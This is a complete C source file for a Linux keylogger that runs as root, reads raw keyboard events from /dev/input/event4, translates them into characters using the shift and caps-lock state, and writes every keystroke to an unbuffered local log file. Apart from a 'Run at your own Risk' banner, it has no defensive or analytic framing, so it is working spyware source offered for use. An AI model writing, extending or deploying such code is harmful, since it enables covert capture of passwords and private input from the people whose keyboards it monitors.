#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>

#define KEY_PRESS 1
#define KEY_RELEASE 0
#define LEFTSHIFT 42
#define RIGHTSHIFT 54
#define CAPSLOCK 58
#define ROOTID 0

// arrays for keys(for both small and capital chars including chars like !@#$%^&*())
static char *keys_upper[] = {"<RESERVED>", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>", "	", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "\n", "<LEFTCTRL>", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "<LEFTSHIFT>", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "<RIGHTSHIFT>", "*", "<LEFTALT>", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<ZENKAKUHANKAKU>", "102ND", "<F11>", "<F12>", "<RO>", "<KATAKANA>", "<HIRAGANA>", "<HENKAN>", "<KATAKANAHIRAGANA>", "<MUHENKAN>", "<JPCOMMA>", "\n", "<RIGHTCTRL>", "/", "<SYSRQ>", "<RIGHTALT>", "<LINEFEED>", "<HOME>", "<UP>", "<PAGEUP>", "<LEFT>", "<RIGHT>", "<END>", "<DOWN>", "<PAGEDOWN>", "<INSERT>", "<DELETE>", "<MACRO>", "<MUTE>", "<VOLUMEDOWN>", "<VOLUMEUP>", "<POWER>", "<KPEQUAL>", "<KPPLUSMINUS>", "<PAUSE>", "<SCALE>", "<KPCOMMA>", "<HANGEUL>", "<HANJA>", "<YEN>", "<LEFTMETA>", "<RIGHTMETA>", "<COMPOSE>"};
static char *keys_lower[] = {"<reserved>", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<backspace>", "	", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<leftctrl>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<leftshift>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<rightshift>", "*", "<leftalt>", " ", "<capslock>", "<f1>", "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>", "<f10>", "<numlock>", "<scrolllock>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<zenkakuhankaku>", "102nd", "<f11>", "<f12>", "<ro>", "<katakana>", "<hiragana>", "<henkan>", "<katakanahiragana>", "<muhenkan>", "<jpcomma>", "\n", "<rightctrl>", "/", "<sysrq>", "<rightalt>", "<linefeed>", "<home>", "<up>", "<pageup>", "<left>", "<right>", "<end>", "<down>", "<pagedown>", "<insert>", "<delete>", "<macro>", "<mute>", "<volumedown>", "<volumeup>", "<power>", "<kpequal>", "<kpplusminus>", "<pause>", "<scale>", "<kpcomma>", "<hangeul>", "<hanja>", "<yen>", "<leftmeta>", "<rightmeta>", "<compose>"};
static char *special_chars[2][20] = {{"`", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[", "]", ";", "'", ",", ".", "/"},{"~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "{", "}", ":", "\"", "<", ">", "?"}};

// checking for shift key
static int isShiftPressed(int eventcode){
	if((eventcode == LEFTSHIFT) || (eventcode == RIGHTSHIFT)){
		return 1;
	}
	return 0;
}

// checking for capslock
static int isCapsOn(int eventcode){
	if(eventcode == CAPSLOCK){
		return 1;
	}
	return 0;
}

// check for chars like !@#$%^&*()_{}:"<>?
static char *checkKey(char *key){
	for(int i=0; i<20; i++){
		if(special_chars[0][i] == key){
			return special_chars[1][i];
		}
	}
	return key;
}

// convert event code to corresponding char
static char *pressedKey(int eventcode, int shift, int caps){
	printf("%d\n", eventcode);
	if(shift^caps){
		char *key = keys_upper[eventcode];
		if(shift == 1){
			key = checkKey(key);
		}
		return key;
	}
	return keys_lower[eventcode];
}

// main function
int main(){

	// initializations
	typedef struct input_event input_event;
	input_event event;
	int shift = 0;
	int caps = 0;					// assuming caps to be off

	// banner
	printf("############ Keylogger Started #############\n");
	printf("########### Run at your own Risk ###########\n");

	// root check
	if(geteuid() != ROOTID){
		printf("You must be root\n");
		exit(0);
	}

	// log file
	FILE *lf = fopen("log", "a");

	// log file check
	if(lf == NULL){
		printf("Error in opening Log file\n");
		exit(0);
	}

	/* To disable buffering and allow writing to log file 
		as soon as a key is pressed */
	setbuf(lf, NULL);

	// device file
	int fp = open("/dev/input/event4", O_RDONLY);

	// device check
	if(fp == -1){
		printf("Device file not found\n");
		exit(0);
	}

	// capturing keystrokes
	while(1){
		if(read(fp, &event, sizeof(input_event))>0){
			if(event.type == EV_KEY){					// checking event type to be of keyboard
				if(event.value == KEY_PRESS){
					if(isShiftPressed(event.code)){
						shift = 1;
					}
					if(isCapsOn(event.code)){
						caps = caps^1;					// switching caps value on every keypress
					}
					char *key = pressedKey(event.code, shift, caps);
					fputs(key, lf);
				}
				if(event.value == KEY_RELEASE){
					if(isShiftPressed(event.code)){
						shift = 0;
					}
				}
			}
		}
	}

	// close file
	close(fp);
	fclose(lf);

	// footer
	printf("Exiting...\n");

	return 0;
}
